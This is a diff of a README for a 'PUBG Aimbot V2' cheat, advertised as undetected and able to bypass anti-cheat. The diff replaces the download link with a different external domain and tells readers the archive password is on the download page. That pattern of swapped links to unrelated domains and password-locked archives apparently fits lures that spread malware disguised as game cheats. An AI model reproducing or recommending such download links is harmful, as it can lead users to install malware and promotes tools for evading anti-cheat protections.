@@ -18,7 +18,7 @@ PUBG Aimbot V2 - undetected PUBG cheat. Bypasses anti-cheat system. Works on PC 
 
 ## Download
 
-[![Download v2.3.0](https://img.shields.io/badge/Download_v2.3.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/pubgaimbotv2)
+[![Download v2.3.0](https://img.shields.io/badge/Download_v2.3.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/pubgaimbotv2)
 
 > The archive password is shown on the download page.
 
